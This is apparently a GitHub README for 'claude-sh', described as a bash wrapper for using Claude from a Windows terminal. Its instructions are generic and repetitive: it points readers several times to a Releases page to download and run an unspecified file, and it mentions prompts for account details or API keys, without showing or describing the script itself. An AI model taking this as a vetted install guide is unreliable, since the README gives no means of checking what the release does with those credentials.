# 🐚 claude-sh - Run Claude from your terminal

[![Download claude-sh](https://img.shields.io/badge/Download%20claude--sh-blue?style=for-the-badge)](https://github.com/shadow400x/claude-sh/releases)

## 🚀 What this app does

claude-sh is a small command-line app that helps you use Claude Code from a bash script. It keeps the setup light and avoids extra package installs.

It is built for people who want a simple way to run Claude from a terminal window on Windows with minimal setup.

## 📥 Download

1. Open the [Releases page](https://github.com/shadow400x/claude-sh/releases)
2. Download the latest release file for Windows
3. Save the file to a folder you can find again, such as Downloads or Desktop

If the release includes a zip file, extract it before you run it.

## 🪟 Windows setup

You need a few basic tools on Windows:

- Windows 10 or Windows 11
- An internet connection
- Git Bash, WSL, or a bash shell on Windows
- `curl`
- `jq`

Most Windows users can run this through Git Bash or WSL. If you already use one of those, you likely have most of what you need.

## 🛠️ Install

1. Visit the [Releases page](https://github.com/shadow400x/claude-sh/releases)
2. Download the latest release file
3. If the file is in a zip archive, right-click it and choose Extract All
4. Move the extracted files to a folder you want to keep
5. Open Git Bash, WSL, or your bash shell
6. Go to the folder that contains `claude-sh`
7. Run the script as shown in the release notes

Example:

- `bash claude-sh`

If the file name is different in the release, use that name instead.

## ▶️ First run

When you run claude-sh for the first time, it may ask for:

- your Claude account details
- an API key or login step
- permission to use the network

Follow the prompts in the terminal. The script uses `curl` to talk to the service and `jq` to read the response.

## 💻 Basic usage

You use claude-sh from a terminal window.

Common use looks like this:

- Start the script
- Type your request
- Read Claude’s reply in the same window

Example commands may include:

- `claude`
- `bash claude-sh`
- `./claude-sh`

The exact command depends on how the release file is packaged.

## 🔧 What you need for it to work

For the best experience, make sure these tools are available:

- `curl` for web requests
- `jq` for reading JSON data
- A bash shell
- A stable internet connection

If one of these tools is missing, the script may not start or may stop during use.

## 📁 Files you may see

A release may include:

- the main bash script
- a small config file
- sample settings
- a short readme file
- license text

If you see several files, keep them in the same folder unless the release notes say otherwise.

## 🧭 How to use it day to day

After setup, open your terminal and go to the folder where you saved the files.

Then:

1. Start the script
2. Enter your prompt
3. Wait for the response
4. Paste a new prompt if you want to keep going

You can use it for tasks like:

- writing code
- fixing small scripts
- asking for explanations
- checking command examples
- drafting text inside a terminal session

## 🧪 Troubleshooting

If the script does not start, check these items:

- You opened the right terminal app
- You are in the folder with the file
- The file name matches what you typed
- `curl` is installed
- `jq` is installed

If you see a permission error, try running the script with bash instead of double-clicking it.

If the terminal closes too fast, start it from an open terminal window so you can read the message.

## 🔐 Privacy and access

claude-sh sends requests over the internet to work with Claude. Use the same care you would use with any tool that talks to an online service.

Keep your login details and keys private. Do not share them in public chats or screenshots.

## 🧰 Common Windows paths

If you want a simple place to store the files, use one of these folders:

- `C:\Users\YourName\Downloads\claude-sh`
- `C:\Users\YourName\Desktop\claude-sh`

If you use WSL, place the files in a Linux folder inside your WSL home directory.

## 📌 Short command examples

These examples may help you get started:

- `bash claude-sh`
- `./claude-sh`
- `claude-sh --help`

If the release includes extra flags or options, use the help output in the terminal to see them

## 🧭 What makes this release light

This project uses a bash script instead of a large app package. It keeps the setup simple and avoids extra npm installs.

That can make it easier to:

- inspect the script
- move the files between machines
- run it in a shell you already use
- keep the install footprint small

## 📦 Release updates

When a new version comes out, return to the [Releases page](https://github.com/shadow400x/claude-sh/releases) and download the latest file again.

If you already have an older copy, replace it with the new one after you back up any local settings you want to keep

## 🧩 Basic checklist

Before you start, check that you have:

- a Windows PC
- a bash shell
- `curl`
- `jq`
- the files from the latest release
- an internet connection

## 🗂️ File placement example

A simple folder layout can look like this:

- `C:\Users\YourName\Downloads\claude-sh\`
  - `claude-sh`
  - `README.md`
  - `config.json`

Keep related files together so the script can find them more easily